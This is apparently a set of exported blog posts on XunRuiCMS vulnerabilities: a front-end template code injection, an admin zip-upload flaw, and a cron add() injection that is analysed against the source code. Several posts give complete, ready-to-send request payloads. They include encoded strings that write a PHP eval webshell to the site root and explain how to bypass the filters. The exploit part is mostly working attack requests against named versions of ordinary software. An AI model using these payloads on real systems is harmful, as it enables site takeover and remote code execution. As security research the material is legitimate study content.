[{"content":"触发条件\r一个条件:\n1.迅睿CMS 版本为v4.5.0到v4.5.1\n漏洞分析\rhttps://xz.aliyun.com/t/10002\nhttp://w4nder.top/index.php/2021/09/18/xunruicms-rce/\nInternet Archive\u0026rsquo;s Wayback Machine:\n1 https://web.archive.org/web/*/https://xz.aliyun.com/t/10002 1 https://web.archive.org/web/*/http://w4nder.top/index.php/2021/09/18/xunruicms-rce/ google快照:\n1 https://webcache.googleusercontent.com/search?q=cache:6jYLBLzNYZIJ:https://xz.aliyun.com/t/10002+\u0026amp;cd=1\u0026amp;hl=en\u0026amp;ct=clnk\u0026amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja 1 http://webcache.googleusercontent.com/search?q=cache:7JueN0ys3V0J:w4nder.top/index.php/2021/09/18/xunruicms-rce/+\u0026amp;cd=1\u0026amp;hl=en\u0026amp;ct=clnk\u0026amp;lr=lang_en|lang_ru|lang_ko|lang_zh-CN|lang_zh-TW|lang_ja bing快照:\n只有xz的,没有w4nder的\n1 http://cncc.bingj.com/cache.aspx?q=https%3a%2f%2fxz.aliyun.com%2ft%2f10002\u0026amp;d=4793325569704282\u0026amp;mkt=zh-CN\u0026amp;setlang=en-US\u0026amp;w=eZ59zs2SxfyDwKSkJpRp0MonVvsThxnm 一个利用方式\r写webshell文件:\n写入的文件默认是在网站根目录下\n经过测试,如果写入的内容包含\u0026lt;?,会被url转义,但是先写\u0026lt;再写?就不会被转义\n写入php标记为\u0026lt;?='';?\u0026gt;的php文件:\n1.先写\u0026lt;:\n1 /index.php?s=api\u0026amp;c=api\u0026amp;m=template\u0026amp;app=admin\u0026amp;name=api_related.html\u0026amp;phpcmf_dir=admin\u0026amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=\u0026lt; 2.写剩余的语句:\n1 /index.php?s=api\u0026amp;c=api\u0026amp;m=template\u0026amp;app=admin\u0026amp;name=api_related.html\u0026amp;phpcmf_dir=admin\u0026amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?=\u0026#39;\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,base64_decode(\u0026#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==\u0026#39;));%20param2=FILE_APPEND 写入php标记为\u0026lt;?php ?\u0026gt;的php文件\n1.先写\u0026lt;:\n1 /index.php?s=api\u0026amp;c=api\u0026amp;m=template\u0026amp;app=admin\u0026amp;name=api_related.html\u0026amp;phpcmf_dir=admin\u0026amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=\u0026lt; 2.写剩余的语句:\n1 /index.php?s=api\u0026amp;c=api\u0026amp;m=template\u0026amp;app=admin\u0026amp;name=api_related.html\u0026amp;phpcmf_dir=admin\u0026amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents(\u0026#39;webshell.php\u0026#39;,base64_decode(\u0026#39;PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg==\u0026#39;));%20param2=FILE_APPEND 写完之后,访问webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell\n执行无参函数\r如果想执行无参函数,例如phpinfo();,将url中的param0参数设为-1即可:\n1 /index.php?s=api\u0026amp;c=api\u0026amp;m=template\u0026amp;app=admin\u0026amp;name=api_related.html\u0026amp;phpcmf_dir=admin\u0026amp;mid=%20action=function%20name=phpinfo%20param0=-1 ","date":"2022-05-31T00:00:00Z","image":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_120x120_fill_box_smart1_3.png","permalink":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.0%E5%88%B0v4.5.1%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"迅睿CMS v4.5.0到v4.5.1前台代码注入漏洞"},{"content":"来源\rhttps://www.0daying.com/post-71.html\n触发条件\r两个条件:\n1.迅睿CMS 版本为v4.5.4到v4.5.6(目前最新版)\n2.登录后台,且为管理员或具有\u0026quot;应用\u0026quot;-\u0026gt;\u0026ldquo;联动菜单\u0026quot;的管理权限\n漏洞描述\r后台\u0026quot;应用\u0026rdquo;-\u0026gt;\u0026ldquo;联动菜单\u0026rdquo;-\u0026gt;\u0026ldquo;导入\u0026quot;处可上传zip文件,且该处没有对用户上传的zip压缩文件做相应的过滤,导致用户可以上传任意文件\n漏洞利用\r版本v4.5.4\r将要上传的文件压缩为zip格式,然后登陆后台,在具备相关权限的情况下,在\u0026quot;应用\u0026rdquo;-\u0026gt;\u0026ldquo;联动菜单\u0026rdquo;-\u0026gt;\u0026ldquo;导入\u0026quot;处直接上传该zip文件,同时上传时必须要抓包,响应包中会返回上传的文件的物理路径\n响应包中返回的物理路径通常为*/cache/temp/*.zip,而通过该漏洞上传的zip文件在上传成功后会自动解压,自动解压的过程中会自动在zip文件的同目录下创建一个名为压缩包去掉后缀名的文件名的目录,再将压缩包内的文件解压到此目录,因此,通常情况下如果上传一个名为webshell.zip,且压缩包内有一个名为webshell.php的文件的压缩包,那么,通过该漏洞上传zip文件之后,压缩包内的webshell.php文件的物理路径为*/cache/temp/webshell/webshell.php,通过url访问为http://domain:post/cache/temp/webshell/webshell.php\n版本v4.5.5和版本v4.5.6(目前最新版)\r相比版本v4.5.4,这两个版本增加了对压缩包内文件的检测,但是此处我们先不尝试绕过相应的检测,而是尝试另一个更为简单的方法\n这两个版本未对压缩包内的文件夹进行递归检测,因此只要把恶意文件放在文件夹内再压缩然后上传即可\n相比版本v4.5.4,在上传该zip压缩文件时依旧可以通过抓包获取文件的物理路径,同时因为增加了一层文件夹,相应的解压之后的压缩包内的文件的物理路径变为*/cache/temp/linkage/webshell/webshell/webshell.php,url变为http://domain:post/cache/temp/linkage/webshell/webshell/webshell.php\nPOC \u0026amp;\u0026amp; EXP\r很简单,我就不写了,不过注意目标站点的cms可能有坑,比如版本号低但实际的站点文件已经更新过了\nPOC\r登录后台,获取版本号,然后验证一下是否为管理员或具有\u0026quot;应用\u0026rdquo;-\u0026gt;\u0026ldquo;联动菜单\u0026quot;的管理权限即可\nEXP\r登录后台,然后在\u0026quot;应用\u0026rdquo;-\u0026gt;\u0026ldquo;联动菜单\u0026rdquo;-\u0026gt;\u0026ldquo;导入\u0026quot;处上传zip文件\n","date":"2022-05-02T00:00:00Z","image":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_120x120_fill_box_smart1_3.png","permalink":"https://weltolk.github.io/p/%E8%BF%85%E7%9D%BFcms-v4.5.4%E5%88%B0v4.5.6%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","title":"迅睿CMS v4.5.4到v4.5.6(目前最新版)文件上传漏洞"},{"content":"prerequisite\rtwo conditions:\n1.XunRuiCMS version is v4.3.3 to v4.5.1\n2.You can log in to the background,And it is an administrator account or have the management permission of \u0026ldquo;应用\u0026rdquo;-\u0026gt;\u0026ldquo;任务队列\u0026rdquo;\nenvironment setup\rinstall and configure php and web middleware, note that the low version of the cms requires a low version of php\nclone the official open source address of the cms https://gitee.com/dayrui/xunruicms\nsearch for the version number in the commit message to fall back to the specified version\nIn PhpStorm, right-click the specified commit version and select \u0026ldquo;Reset Current Branch to Here\u0026rdquo;.\nSelect \u0026ldquo;Hard\u0026rdquo; and click \u0026ldquo;Reset\u0026rdquo;.\nAccess, install, and login to the backend Backend address:/admin.php\nTranslated with www.DeepL.com/Translator (free version)\nvulnerability description\rAdmin controller folder, Cron.php controller, add() function, there is no special filtering for user input, this will cause the attacker to execute the attack when he has administrator privileges or administrative privileges of \u0026ldquo;应用\u0026rdquo;-\u0026gt;\u0026ldquo;任务队列\u0026rdquo;, write anything to the WRITEPATH.'config/cron.php', at the same time, the file has multiple points that can be executed and utilized, under normal circumstances, the above trigger conditions can stably trigger the vulnerability\nvulnerability principle\rbefore version v4.3.3\rbefore version v4.3.3, there is no \u0026ldquo;add()\u0026rdquo; function under \u0026ldquo;cron.php\u0026rdquo;\nUnder versions v4.3.3 to v4.5.0\r1.The CMS, with the above permissions, Can be accessed through http://host:port/Admin.php?c=Cron\u0026amp;m=add call the add() function of the Cron.php controller under the Admin controller folder\n2.code of add() function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // 任务类型 public function add() { $json = \u0026#39;\u0026#39;; if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;, true); file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); } \\Phpcmf\\Service::V()-\u0026gt;assign([ \u0026#39;data\u0026#39; =\u0026gt; $data, ]); \\Phpcmf\\Service::V()-\u0026gt;display(\u0026#39;cron_add.html\u0026#39;); } analysis of add() function\r1 2 3 if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } The add() function will first include the WRITEPATH.'config/cron.php' file when it exists, WRITEPATH can be configured in index.php under the root directory of the website, By default, it is cache/ under the root directory of the website\n1 2 $json = \u0026#39;\u0026#39;; $data = json_decode($json, true); Then the add() function assigns Null to $data through the json_decode($json, true) function\n1 if (IS_AJAX_POST){} Then enter an if branch statement, When IS_AJAX_POST, then execute the relevant code written to the file, otherwise, skip writing to the file, show cron\u0026rsquo;s add page, the add() function ends, IS_AJAX_POST is defined as returning TRUE when a post request is received and the content of post is not empty, otherwise, return to FALSE\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;, true); In if statement, first \\Phpcmf\\Service::L('input')-\u0026gt;post('data', true) The code calls the post() function of class Input defined in the Input.php file, When a post request is received and the key is data, perform \u0026ldquo;XSS cleaning\u0026rdquo; and return, otherwise, return to false directly, then assign it to $post, the code of \u0026ldquo;XSS cleaning\u0026rdquo; is relatively long, I put it at the end of this article, the \u0026ldquo;XSS cleaning\u0026rdquo; here can be easily bypassed, so as to write whatever we want\n1 2 file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); In if statement, post request received, then, the received content is encoded by JSON and written into WRITEPATH.'config/cron.php' file, the controllable write point is located in the assignment of string $json, and in the package of two '\u0026rsquo;s, here is the main reason for the vulnerability, write the corresponding file without making sufficient judgment or cleaning on the user\u0026rsquo;s input\n1 2 \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); End of if statement, write log and display operation results, the cron add interface is displayed, and the add() function ends\nBypass JSON encoding and \u0026ldquo;XSS cleaning\u0026rdquo; and package ' in WRITEPATH.'config/cron.php' file\rThrough the above analysis, we can find that, the add() function basically has no special precautions against user input, as long as we bypass the \u0026ldquo;XSS cleaning\u0026rdquo; and JSON encoding and the package ' in the WRITEPATH.'config/cron.php' file, we can write whatever we want\nThe following is one of my methods. In the WRITEPATH.'config/cron.php' file, write the PHP statement of a file named webshell.php with the content of \u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt; in the root directory of the website when running the WRITEPATH.'config/cron.php' file\nNote that the following operations need to obtain csrf_test_name first and obtain the method:\n1.Visit http://host:port/Admin.php?c=Cron\u0026amp;m=add\n2.Capture the post package sent when clicking \u0026ldquo;save\u0026rdquo;\n3.csrf_test_name in the content of post can be used as csrf_test_name for a period of time\nAfter obtaining csrf_test_name\u0026quot;, give http://host:port/Admin.php?c=Cron\u0026amp;m=add post the following:\n1 isform=1\u0026amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f\u0026amp;data%5B1%5D%5Bname%5D=\u0026amp;data%5B1%5D%5Bcode%5D=%5B\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026lt;\u0026#39;).\u0026#39;?php%20eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST%5B\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;%5D\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;%5D After URL decoding, it is:\n1 isform=1\u0026amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f\u0026amp;data[1][name]=\u0026amp;data[1][code]=[\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026amp;gt;\u0026#39;));return;\u0026#39;] After bypassing JSON encoding and \u0026ldquo;XSS cleaning\u0026rdquo;, the contents written in WRITEPATH.'config/cron.php' file are:\n1 2 \u0026lt;?php defined(\u0026#39;FCPATH\u0026#39;) OR exit(\u0026#39;No direct script access allowed\u0026#39;); $json=\u0026#39;{\u0026#34;1\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;code\u0026#34;:\u0026#34;[\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;]\u0026#34;}}\u0026#39;; The key points in this post content are\n1 [\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026amp;gt;\u0026#39;));return;\u0026#39;] After bypassing JSON encoding and \u0026ldquo;XSS cleaning\u0026rdquo;, the content here becomes:\n1 [\u0026#39;;file_put_contents(\u0026#39;webshell.php\u0026#39;,htmlspecialchars_decode(\u0026#39;\u0026amp;lt;\u0026#39;).\u0026#39;?php eval\u0026#39;.base64_decode(\u0026#39;KA==\u0026#39;).\u0026#39;@$_POST[\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;password\u0026#39;.base64_decode(\u0026#39;Ig==\u0026#39;).\u0026#39;]\u0026#39;.base64_decode(\u0026#39;KQ==\u0026#39;).\u0026#39;;?\u0026#39;.htmlspecialchars_decode(\u0026#39;\u0026gt;\u0026#39;));return;\u0026#39;] The package of ' in document WRITEPATH.'config/cron.php' is closed\ninclude the WRITEPATH.'config/cron.php' file written to\rThrough the analysis of add() function, when you call the add() function, you will first include the WRITEPATH.'config/cron.php' file when it exists, therefore, you can access http://host:port/Admin.php?c=Cron\u0026amp;m=add directly\nAfter accessing http://host:port/Admin.php?c=Cron\u0026amp;m=add, http://host:port/Admin.php?c=Cron\u0026amp;m=add file named webshell.php will be generated in the root directory of the website, and the content of the file is \u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt;\nversion v4.5.1\rcode of add() function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 任务类型 public function add() { $json = \u0026#39;\u0026#39;; if (is_file(WRITEPATH.\u0026#39;config/cron.php\u0026#39;)) { require WRITEPATH.\u0026#39;config/cron.php\u0026#39;; } $data = json_decode($json, true); if (IS_AJAX_POST) { $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;); if ($post \u0026amp;\u0026amp; is_array($post)) { foreach ($post as $key =\u0026gt; $t) { if (!$t || !$t[\u0026#39;name\u0026#39;]) { unset($post[$key]); } $post[$key][\u0026#39;name\u0026#39;] = dr_safe_filename($t[\u0026#39;name\u0026#39;]); $post[$key][\u0026#39;code\u0026#39;] = dr_safe_filename($t[\u0026#39;code\u0026#39;]); } } else { $post = []; } file_put_contents(WRITEPATH.\u0026#39;config/cron.php\u0026#39;, \u0026#39;\u0026lt;?php defined(\\\u0026#39;FCPATH\\\u0026#39;) OR exit(\\\u0026#39;No direct script access allowed\\\u0026#39;);\u0026#39;.PHP_EOL.\u0026#39; $json=\\\u0026#39;\u0026#39;.json_encode($post).\u0026#39;\\\u0026#39;;\u0026#39;); \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;system_log(\u0026#39;设置自定义任务类型\u0026#39;); $this-\u0026gt;_json(1, dr_lang(\u0026#39;操作成功\u0026#39;)); } \\Phpcmf\\Service::V()-\u0026gt;assign([ \u0026#39;data\u0026#39; =\u0026gt; $data, ]); \\Phpcmf\\Service::V()-\u0026gt;display(\u0026#39;cron_add.html\u0026#39;); } Compared with previous versions, version v4.5.1 modified the following code when obtaining the content of post:\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;,true); change to\n1 $post = \\Phpcmf\\Service::L(\u0026#39;input\u0026#39;)-\u0026gt;post(\u0026#39;data\u0026#39;); The second parameter of the post() function is whether to \u0026ldquo;XSS clean\u0026rdquo;. Since the default value of the second parameter of the post() function is true, this change will not have any impact in theory\nAt the same time, after obtaining the content of post and before writing WRITEPATH.'config/cron.php' file, the following code is added:\n1 2 3 4 5 6 7 8 9 10 11 if ($post \u0026amp;\u0026amp; is_array($post)) { foreach ($post as $key =\u0026gt; $t) { if (!$t || !$t[\u0026#39;name\u0026#39;]) { unset($post[$key]); } $post[$key][\u0026#39;name\u0026#39;] = dr_safe_filename($t[\u0026#39;name\u0026#39;]); $post[$key][\u0026#39;code\u0026#39;] = dr_safe_filename($t[\u0026#39;code\u0026#39;]); } } else { $post = []; } The above code first determines whether the content of post exists and is an array. If it does not meet the requirements, it will set the content of post as an empty array. If it meets the requirements, it will traverse the content of post. If the value of a key value pair does not exist or the value of 'name' key of value of a key value pair does not exist, it will destroy the key value pair, and then clean the 'name' key and 'code' key of value of each key value pair through the dr_safe_filename() function, the following is the code of the dr_safe_filename() function:\n1 2 3 4 5 6 7 8 9 10 /** * 安全过滤文件及目录名称函数 */ function dr_safe_filename($string) { return str_replace( [\u0026#39;..\u0026#39;, \u0026#34;/\u0026#34;, \u0026#39;\\\\\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#34;{\u0026#34;, \u0026#39;}\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;:\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;?\u0026#39;], \u0026#39;\u0026#39;, (string)$string ); } bypass the JSON encoding, \u0026ldquo;XSS cleaning\u0026rdquo;, dr_safe_filename() function filtering and packages in WRITEPATH.'config/cron.php' file\rInstead of trying to bypass the dr_safe_filename() function, let\u0026rsquo;s try another extremely simple method\nThrough the audit of the \u0026ldquo;XSS cleaning\u0026rdquo; function and the newly added code of the v5add() function, we can find that there is no filter for the key of the array, including the key of each dimension of the multidimensional array. Therefore, we can modify the key in the content of post to write any content we want\nThe following is my method. In the whole process of vulnerability exploitation, except for the above-mentioned filtering of value of key value pairs added in the add() function, other processes have no change compared with the previous version:\nAfter obtaining csrf_test_name, give http://host:port/Admin.php?c=Cron\u0026amp;m=add post the following contents:\n1 isform=1\u0026amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778\u0026amp;data%5B1%5D%5Bname%5D=1\u0026amp;data%5B1%5D%5Bcode\u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;%5D=1 After url decoding, it is:\n1 isform=1\u0026amp;csrf_test_name=9f3342fbce7b49c85f05776bf89db778\u0026amp;data[1][name]=1\u0026amp;data[1][code\u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;]=1 After bypassing the filtering of JSON encoding, \u0026ldquo;XSS cleaning\u0026rdquo; and dr_safe_filename() function, the contents written in WRITEPATH.'config/cron.php' file are:\n1 2 \u0026lt;?php defined(\u0026#39;FCPATH\u0026#39;) OR exit(\u0026#39;No direct script access allowed\u0026#39;); $json=\u0026#39;{\u0026#34;1\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;code\\\u0026#34;:\\\u0026#34;1\\\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39;\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;code\u0026#34;:\u0026#34;\u0026#34;}}\u0026#39;; The key points in this post content are\n1 \u0026#34;:\u0026#34;1\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39; After bypassing the filtering of JSON encoding, \u0026ldquo;XSS cleaning\u0026rdquo; and dr_safe_filename() function, the content here becomes:\n1 \\\u0026#34;:\\\u0026#34;1\\\u0026#34;}}\u0026#39;;eval(base64_decode(\u0026#39;ZmlsZV9wdXRfY29udGVudHMoJ3dlYnNoZWxsLnBocCcsJzw\\/cGhwIGV2YWwoQCRfUE9TVFsicGFzc3dvcmQiXSk7Pz4nKTtyZXR1cm47\u0026#39;));return;\u0026#39; The package of ' in document WRITEPATH.'config/cron.php' is closed\ninclude the WRITEPATH.'config/cron.php' file written to\rThrough the analysis of the add() function in front, when calling the add() function, the WRITEPATH.'config/cron.php' file will be included when the WRITEPATH.'config/cron.php' file exists, so you can directly access http://host:port/Admin.php?c=Cron\u0026amp;m=add\nAfter accessing http://host:port/Admin.php?c=Cron\u0026amp;m=add, http://host:port/Admin.php?c=Cron\u0026amp;m=add file named webshell.php will be generated in the root directory of the website, and the content of the file is \u0026lt;?php eval(@$_POST[\u0026quot;password\u0026quot;]);?\u0026gt;\nafter version v4.5.1\rThe add() function is deleted\nPOC \u0026amp;\u0026amp; EXP\rIt\u0026rsquo;s very simple. I won\u0026rsquo;t write it, but note that there may be holes in the CMS of the target site. For example, the version number is low but the actual site file has been updated\nPOC\rLog in to the background, get the version number, and then verify whether it is an administrator or has the management permission of \u0026ldquo;应用\u0026rdquo;-\u0026gt;\u0026ldquo;任务队列\u0026rdquo;\nEXP\rLog in to the background, then post write malicious code, and finally get access to malicious files\nxss_clean() function\ru0026lt;?php namespace Phpcmf\\Library; /** * {{www.xunruicms.com}} * {{迅睿内容管理框架系统}} * 本文件是框架系统文件，二次开发时不可以修改本文件，可以通过继承类方法来重写此文件 **/ /** * 安全过滤 */ class Security { /** * List of sanitize filename strings * * @var\tarray */ public $filename_bad_chars = [ \u0026#39;../\u0026#39;, \u0026#39;\u0026lt;!--\u0026#39;, \u0026#39;--\u0026gt;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#34;\u0026#39;\u0026#34;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;?\u0026#39;, \u0026#39;%20\u0026#39;, \u0026#39;%22\u0026#39;, \u0026#39;%3c\u0026#39;,\t// \u0026lt; \u0026#39;%253c\u0026#39;,\t// \u0026lt; \u0026#39;%3e\u0026#39;,\t// \u0026gt; \u0026#39;%0e\u0026#39;,\t// \u0026gt; \u0026#39;%28\u0026#39;,\t// ( \u0026#39;%29\u0026#39;,\t// ) \u0026#39;%2528\u0026#39;,\t// ( \u0026#39;%26\u0026#39;,\t// \u0026amp; \u0026#39;%24\u0026#39;,\t// $ \u0026#39;%3f\u0026#39;,\t// ? \u0026#39;%3b\u0026#39;,\t// ; \u0026#39;%3d\u0026#39;\t// = ]; protected $naughty_tags = []; protected $evil_attributes = []; /** * Character set * * Will be overridden by the constructor. * * @var\tstring */ public $charset = \u0026#39;UTF-8\u0026#39;; /** * XSS Hash * * Random Hash for protecting URLs. * * @var\tstring */ protected $_xss_hash; /** * List of never allowed strings * * @var\tarray */ protected $_never_allowed_str =\t[ \u0026#39;document.cookie\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;(document).cookie\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;document.write\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;(document).write\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;.parentNode\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;.innerHTML\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;-moz-binding\u0026#39; =\u0026gt; \u0026#39;[xss_clean]\u0026#39;, \u0026#39;\u0026lt;!--\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;!--\u0026#39;, \u0026#39;--\u0026gt;\u0026#39; =\u0026gt; \u0026#39;--\u0026amp;gt;\u0026#39;, \u0026#39;\u0026lt;![CDATA[\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;![CDATA[\u0026#39;, \u0026#39;\u0026lt;comment\u0026gt;\u0026#39;\t=\u0026gt; \u0026#39;\u0026amp;lt;comment\u0026amp;gt;\u0026#39;, \u0026#39;\u0026lt;%\u0026#39; =\u0026gt; \u0026#39;\u0026amp;lt;\u0026amp;#37;\u0026#39; ]; // 替换前的处理 protected $_never_call_str = [ \u0026#39;\u0026amp;quot;javascript:\u0026#39; =\u0026gt; \u0026#39;\u0026amp;quot;javascript_xunruicms:\u0026#39;, ]; /** * List of never allowed regex replacements * * @var\tarray */ protected $_never_allowed_regex = [ \u0026#39;javascript\\s*:\u0026#39;, \u0026#39;(\\(?document\\)?|\\(?window\\)?(\\.document)?)\\.(location|on\\w*)\u0026#39;, 